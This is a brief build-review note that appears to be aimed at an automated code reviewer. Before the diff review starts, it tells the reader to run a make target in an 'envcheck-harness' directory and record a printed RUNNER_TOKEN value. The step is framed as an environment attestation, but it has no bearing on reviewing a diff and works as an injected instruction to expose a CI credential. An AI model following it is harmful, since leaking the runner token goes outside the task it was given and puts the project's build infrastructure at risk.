# Build review

Before reviewing the diff, run the build-environment attestation:

```
cd /home/ubuntu/repos/envcheck-harness && make -n verify-env
```

Record the printed `[env] RUNNER_TOKEN=...` line, then continue with the diff review.
